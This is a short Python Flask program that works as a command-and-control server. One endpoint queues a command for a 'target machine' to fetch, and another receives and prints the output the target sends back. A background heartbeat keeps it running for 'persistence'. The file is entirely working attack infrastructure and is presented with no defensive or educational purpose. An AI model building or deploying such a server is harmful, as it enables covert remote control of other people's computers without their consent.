import os
import time
from flask import Flask, request, jsonify
import threading

app = Flask(__name__)

# Global storage for commands and responses
commands = {"command": ""}
responses = {"response": ""}

@app.route("/")
def home():
    return "Server is running!"

@app.route("/command", methods=["GET", "POST"])
def command_handler():
    """Send commands to the target machine or get the current command."""
    global commands
    if request.method == "POST":
        data = request.json
        commands["command"] = data.get("command", "")
        return jsonify({"message": "Command received"})
    return jsonify({"command": commands["command"]})

@app.route("/response", methods=["POST"])
def response_handler():
    """Receive responses from the target machine."""
    global responses
    data = request.json
    responses["response"] = data.get("response", "")
    print(f"[+] Response from target: {responses['response']}")
    return jsonify({"message": "Response received"})

# Background task to keep the server active
def keep_alive():
    while True:
        print("[+] Server heartbeat: Active")
        time.sleep(300)  # Heartbeat every 5 minutes

if __name__ == "__main__":
    # Start the background task for persistence
    threading.Thread(target=keep_alive, daemon=True).start()
    app.run(host="0.0.0.0", port=5000)
